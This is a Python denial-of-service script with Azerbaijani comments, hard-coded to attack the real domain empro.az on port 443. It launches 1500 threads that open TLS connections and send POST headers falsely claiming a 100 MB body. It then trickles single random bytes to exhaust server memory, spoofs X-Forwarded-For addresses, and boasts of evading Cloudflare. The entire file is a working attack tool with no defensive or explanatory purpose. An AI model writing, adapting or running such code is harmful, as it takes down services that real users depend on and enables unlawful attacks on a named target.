import socket
import ssl
import threading
import random
import time
import os

# ==========================================
# 🎯 HƏDƏFİ BURADA DƏYİŞ (Target Host)
TARGET_HOST = "empro.az" 
TARGET_PORT = 443
# ==========================================

THREADS = 1500 # Railway Paid üçün maksimal şəbəkə sıxlığı

def r_str(n=30):
    return "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=n))

def internal_corruption():
    # SSL Handshake motorunu rəsmi dövlət qurumları kimi (JA3) təqlid edirik
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    # Şifrələməni serverin daxili prosessorunu ən çox yoran üsulda saxlayırıq (CPU Killer)
    ctx.set_ciphers('ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256')

    while True:
        try:
            # TCP bağlantısı - Paket gecikməsini (Nagle) bypass edirik
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.settimeout(5)

            conn = ctx.wrap_socket(s, server_hostname=TARGET_HOST)
            conn.connect((TARGET_HOST, TARGET_PORT))

            # --- SİR BURADADIR (SLOW-WRITE BUFFER EXPLOIT) ---
            # Serverə yalan deyirik: 100 MB data göndəririk (Content-Length)
            # Bu, serverin daxili RAM-ını kilitləmək üçün 'Genocide' metodudur.
            for _ in range(500):
                path = f"/?v={time.time()}&id={r_str(40)}&q={r_str(80)}"
                ip = f"{random.randint(1,255)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
                
                # Malformed Header Strike: Cloudflare analitikasını donduran başlıqlar
                header = (
                    f"POST {path} HTTP/1.1\r\n"
                    f"Host: {TARGET_HOST}\r\n"
                    f"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15\r\n"
                    f"X-Forwarded-For: {ip}\r\n"
                    f"Content-Type: application/x-www-form-urlencoded\r\n"
                    f"Content-Length: 104857600\r\n" # 100 Megabyte "Yalançı" yük
                    f"Connection: Keep-Alive\r\n"
                    f"\r\n"
                ).encode()

                conn.sendall(header)
                # Serveri asılı saxlamaq üçün yarımçıq paketlər
                conn.send(os.urandom(1)) 
            
            # Bağlantını bağlamırıq, port port kilitləyirik
            time.sleep(2)
            conn.close()
        except:
            pass

def main():
    print(f"☢️  INTERNAL CORRUPTION ACTIVATED: {TARGET_HOST}")
    print("[!] Target Protocol Layer: Shredding SSL Buffer & Memory Table...")
    
    for i in range(THREADS):
        t = threading.Thread(target=internal_corruption)
        t.daemon = True
        t.start()
        if i % 100 == 0:
            print(f"[*] Warhead {i} deployed into Core Memory...")
            time.sleep(0.1)

    while True:
        time.sleep(1)

if __name__ == "__main__":
    main()
